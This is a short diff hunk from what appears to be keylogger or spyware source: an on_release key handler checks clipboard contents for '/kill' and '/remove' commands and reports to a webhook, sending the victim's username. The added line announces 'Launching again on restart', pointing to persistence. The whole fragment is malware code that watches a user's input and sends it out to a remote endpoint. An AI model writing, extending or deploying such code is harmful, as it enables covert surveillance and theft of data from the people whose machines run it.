@@ -100,6 +100,7 @@ def on_release(key):
         last_clipboard = current_clipboard
         if "/kill" in current_clipboard:
             send_to_webhook(f"Kill command executed by: {username}")
+            send_to_webhook("Launching again on restart.")
             return False
 
         elif "/remove" in current_clipboard:
